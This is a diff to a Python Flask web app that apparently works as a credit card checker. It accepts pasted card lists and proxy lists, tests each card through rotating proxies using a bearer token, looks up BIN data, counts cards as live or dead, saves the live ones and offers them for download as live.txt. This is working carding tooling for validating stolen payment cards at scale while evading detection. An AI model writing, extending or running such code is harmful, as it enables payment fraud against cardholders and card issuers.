@@ -762,4 +762,136 @@ def check_single_card(card_line, proxy_pool, token_manager):
         except Exception:
             pass
 
-def background_worker(cards, proxies_list, 
+def background_worker(cards, proxies_list, max_threads):
+    raw_pool = WebProxyPool(proxies_list)
+    valid_proxies = []
+    total_proxies = len(raw_pool.proxies)
+
+    if total_proxies > 0:
+        checker_queue.put({"status_msg": f"Testing {total_proxies} proxy/proxies..."})
+        for p_str in raw_pool.proxies:
+            p = p_str
+            if "://" not in p:
+                parts = p.split(":")
+                if len(parts) == 2:
+                    p = f"http://{parts[0]}:{parts[1]}"
+                elif len(parts) == 4:
+                    h, po, u, pw = parts
+                    safe_pw = urllib.parse.quote(pw, safe='')
+                    p = f"http://{u}:{safe_pw}@{h}:{po}"
+            p_dict = {"http": p, "https": p}
+            if test_proxy(p_dict):
+                valid_proxies.append(p_str)
+        
+        proxy_pool = WebProxyPool(valid_proxies) if valid_proxies else None
+        checker_queue.put({"status_msg": f"Proxy check complete: {len(valid_proxies)} active. Starting..."})
+    else:
+        proxy_pool = None
+        checker_queue.put({"status_msg": "Running in multi-threaded proxyless mode..."})
+
+    token_manager = DynamicTokenManager(FALLBACK_BEARER_TOKEN, proxy_pool)
+    counts = {"checked": 0, "live": 0, "dead": 0, "error": 0, "total": len(cards)}
+    counts_lock = threading.Lock()
+
+    def worker_task(card):
+        if checker_stop_event.is_set():
+            return
+        
+        code, status, detail = check_single_card(card, proxy_pool, token_manager)
+        bin_code = card.split("|")[0].strip()[:6]
+        
+        bin_meta = fetch_best_bin(bin_code)
+
+        current_proxy_used = proxy_pool.proxies[(proxy_pool.i - 1) % len(proxy_pool.proxies)] if proxy_pool and proxy_pool.proxies else None
+
+        with counts_lock:
+            counts["checked"] += 1
+            if code == 0:
+                counts["live"] += 1
+                save_live_card(card, detail, bin_meta, current_proxy_used)
+            elif code == 1:
+                counts["dead"] += 1
+            else:
+                counts["error"] += 1
+
+            checker_queue.put({
+                "card": card,
+                "status": status,
+                "code": code,
+                "detail": detail,
+                "bin_info": bin_meta,
+                **counts
+            })
+
+    with ThreadPoolExecutor(max_workers=max(1, int(max_threads))) as executor:
+        futures = [executor.submit(worker_task, card) for card in cards]
+        for future in as_completed(futures):
+            if checker_stop_event.is_set():
+                break
+
+    checker_queue.put({"finished": True, **counts})
+
+@app.route('/api/checker/start', methods=['POST'])
+def api_checker_start():
+    global checker_queue, checker_stop_event
+    checker_stop_event.set()
+    while not checker_queue.empty():
+        try:
+            checker_queue.get_nowait()
+        except Exception:
+            break
+
+    checker_stop_event = threading.Event()
+    data = request.get_json() or {}
+    
+    cards = [line.strip() for line in data.get('cards', '').split('\n') if line.strip()]
+    proxies = [p.strip() for p in data.get('proxies', '').split('\n') if p.strip()]
+    
+    try:
+        threads_val = int(data.get('threads', 5))
+    except ValueError:
+        threads_val = 5
+
+    if not cards:
+        return jsonify({"success": False, "message": "No cards provided"}), 400
+
+    threading.Thread(target=background_worker, args=(cards, proxies, threads_val), daemon=True).start()
+    return jsonify({"success": True})
+
+@app.route('/api/checker/stop', methods=['POST'])
+def api_checker_stop():
+    checker_stop_event.set()
+    return jsonify({"success": True})
+
+@app.route('/api/checker/poll')
+def api_checker_poll():
+    items = []
+    while not checker_queue.empty() and len(items) < 50:
+        try:
+            items.append(checker_queue.get_nowait())
+        except queue.Empty:
+            break
+    return jsonify({"success": True, "items": items})
+
+@app.route('/api/checker/stream')
+def api_checker_stream():
+    def event_stream():
+        while not checker_stop_event.is_set():
+            try:
+                data = checker_queue.get(timeout=1.0)
+                yield f"data: {json.dumps(data)}\n\n"
+                if data.get("finished"):
+                    break
+            except queue.Empty:
+                yield ": keepalive\n\n"
+    return Response(event_stream(), mimetype="text/event-stream")
+
+@app.route('/api/checker/export')
+def api_checker_export():
+    if os.path.exists(LIVE_FILE):
+        return send_file(LIVE_FILE, as_attachment=True, download_name="live.txt")
+    return "No live cards found.", 404
+
+if __name__ == '__main__':
+    port = int(os.environ.get('PORT', 5000))
+    app.run(host='0.0.0.0', port=port, threaded=True)
